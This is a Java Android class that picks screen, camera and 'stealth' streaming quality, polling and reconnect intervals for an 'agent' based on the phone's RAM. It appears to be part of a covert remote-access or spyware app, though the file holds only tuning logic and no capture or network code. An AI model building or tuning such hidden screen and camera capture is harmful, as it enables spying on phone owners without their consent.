package com.gls.sim1;

import android.app.ActivityManager;
import android.content.Context;
import android.os.Build;

/**
 * Picks streaming/polling parameters based on how much RAM and CPU the phone
 * realistically has, so the agent stays light on low-end hardware and still
 * looks good on flagships. Everything is derived once and cached.
 */
public final class DeviceTier {
    private static volatile boolean ready = false;
    private static volatile int tier;            // 0 = low, 1 = mid, 2 = high

    // stream knobs
    private static volatile int stealthMaxWidth;
    private static volatile int stealthQuality;
    private static volatile int screenMaxW;
    private static volatile int screenMaxH;
    private static volatile int screenQuality;
    private static volatile int camMaxW;
    private static volatile int camMaxH;
    private static volatile int camQuality;
    private static volatile int pollMs;
    private static volatile int reconnectMs;

    private DeviceTier() {}

    public static synchronized void init(Context ctx) {
        if (ready) return;
        int t = 1;
        try {
            ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            boolean lowRam = am != null && am.isLowRamDevice();
            int memClass = am != null ? am.getMemoryClass() : 128; // MB heap
            long totalRam = totalRamMb();
            if (lowRam || memClass <= 96 || (totalRam > 0 && totalRam <= 2600)) {
                t = 0;
            } else if (memClass >= 256 && (totalRam == 0 || totalRam >= 5200)) {
                t = 2;
            }
        } catch (Throwable ignored) {
        }
        tier = t;
        if (t == 0) {
            stealthMaxWidth = 420; stealthQuality = 34;
            screenMaxW = 480; screenMaxH = 900; screenQuality = 38;
            camMaxW = 640; camMaxH = 480; camQuality = 34;
            pollMs = 6000; reconnectMs = 4000;
        } else if (t == 1) {
            stealthMaxWidth = 540; stealthQuality = 42;
            screenMaxW = 600; screenMaxH = 1200; screenQuality = 45;
            camMaxW = 854; camMaxH = 480; camQuality = 40;
            pollMs = 4500; reconnectMs = 3000;
        } else {
            stealthMaxWidth = 720; stealthQuality = 52;
            screenMaxW = 720; screenMaxH = 1440; screenQuality = 55;
            camMaxW = 1280; camMaxH = 720; camQuality = 45;
            pollMs = 4000; reconnectMs = 2500;
        }
        ready = true;
        android.util.Log.i("SIM1", "DeviceTier=" + t + " memClass=" + heapMb(ctx) + " totalRam=" + totalRamMb()
                + " stealthW=" + stealthMaxWidth + " q=" + stealthQuality);
    }

    private static long totalRamMb() {
        try {
            if (Build.VERSION.SDK_INT >= 16) {
                ActivityManager.MemoryInfo mi = new ActivityManager.MemoryInfo();
                ActivityManager am = (ActivityManager)
                        Foreground.ctx().getSystemService(Context.ACTIVITY_SERVICE);
                if (am != null) {
                    am.getMemoryInfo(mi);
                    return mi.totalMem / (1024 * 1024);
                }
            }
        } catch (Throwable ignored) {
        }
        return 0;
    }

    private static int heapMb(Context ctx) {
        try {
            ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            return am != null ? am.getMemoryClass() : 0;
        } catch (Throwable ignored) {
            return 0;
        }
    }

    public static int tier() { return tier; }
    public static int stealthMaxWidth() { return stealthMaxWidth; }
    public static int stealthQuality() { return stealthQuality; }
    public static int screenMaxW() { return screenMaxW; }
    public static int screenMaxH() { return screenMaxH; }
    public static int screenQuality() { return screenQuality; }
    public static int camMaxW() { return camMaxW; }
    public static int camMaxH() { return camMaxH; }
    public static int camQuality() { return camQuality; }
    public static int pollMs() { return pollMs; }
    public static int reconnectMs() { return reconnectMs; }
}
